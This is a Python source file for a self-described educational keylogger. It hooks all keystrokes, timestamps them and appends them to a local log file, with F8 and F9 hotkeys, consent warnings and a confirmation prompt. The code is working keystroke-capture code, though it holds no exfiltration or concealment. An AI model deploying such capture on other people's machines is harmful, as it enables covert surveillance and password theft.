import keyboard
import datetime
import os
import threading
from pathlib import Path

class EducationalKeylogger:
    def __init__(self, log_file="keylog_educational.txt", max_log_size=10000):
        self.log_file = log_file
        self.max_log_size = max_log_size
        self.is_logging = False
        self.log_buffer = []
        
        print("Educational Keylogger Initialized")
        print("This is for LEARNING PURPOSES ONLY!")
        print(f"Log file: {self.log_file}")
        print("Press F8 to start/stop logging")
        print("Press F9 to exit\n")
    
    def check_file_size(self):
        """Prevent log files from growing too large"""
        if os.path.exists(self.log_file):
            file_size = os.path.getsize(self.log_file)
            if file_size > self.max_log_size:
                # Archive old log and create new one
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                archive_name = f"keylog_archive_{timestamp}.txt"
                os.rename(self.log_file, archive_name)
                print(f"Log archived as: {archive_name}")
    
    def on_key_event(self, event):
        """Callback function for key events"""
        if not self.is_logging:
            return
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Handle special keys
        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name
            
            # Format special keys
            if len(key_name) > 1:
                key_name = f"[{key_name.upper()}]"
            
            log_entry = f"{timestamp} - Key: {key_name}\n"
            self.log_buffer.append(log_entry)
            
            # Write to file every 10 keystrokes to reduce disk I/O
            if len(self.log_buffer) >= 10:
                self.flush_buffer()
    
    def flush_buffer(self):
        """Write buffered logs to file"""
        if self.log_buffer:
            try:
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.writelines(self.log_buffer)
                self.log_buffer.clear()
            except Exception as e:
                print(f"Error writing to log file: {e}")
    
    def toggle_logging(self):
        """Toggle logging on/off"""
        self.is_logging = not self.is_logging
        status = "STARTED" if self.is_logging else "STOPPED"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"\n{'='*50}\nLogging {status} at {timestamp}\n{'='*50}\n"
        
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        print(f"Logging {status}")
    
    def exit_keylogger(self):
        """Clean exit from keylogger"""
        print("\nExiting keylogger...")
        self.flush_buffer()
        
        # Add exit message to log
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        exit_message = f"\nKeylogger stopped at {timestamp}\n"
        
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(exit_message)
        
        keyboard.unhook_all()
        print("Keylogger stopped successfully.")
        os._exit(0)
    
    def start(self):
        """Start the keylogger"""
        try:
            # Set up hotkeys
            keyboard.add_hotkey('f8', self.toggle_logging)
            keyboard.add_hotkey('f9', self.exit_keylogger)
            
            # Register key event callback
            keyboard.hook(self.on_key_event)
            
            print("Keylogger is running in the background...")
            print("F8: Start/Stop logging | F9: Exit")
            
            # Keep the program running
            keyboard.wait()
            
        except KeyboardInterrupt:
            self.exit_keylogger()
        except Exception as e:
            print(f"An error occurred: {e}")
            self.exit_keylogger()

# Safety check and main execution
if __name__ == "__main__":
    # Additional safety warning
    print("🔒 EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY")
    print("🔒 ONLY USE ON YOUR OWN SYSTEMS WITH PROPER CONSENT")
    print("🔒 UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL\n")
    
    response = input("Do you understand and accept responsibility? (yes/no): ")
    
    if response.lower() in ['yes', 'y']:
        keylogger = EducationalKeylogger()
        keylogger.start()
    else:
        print("Program terminated. Safety first!")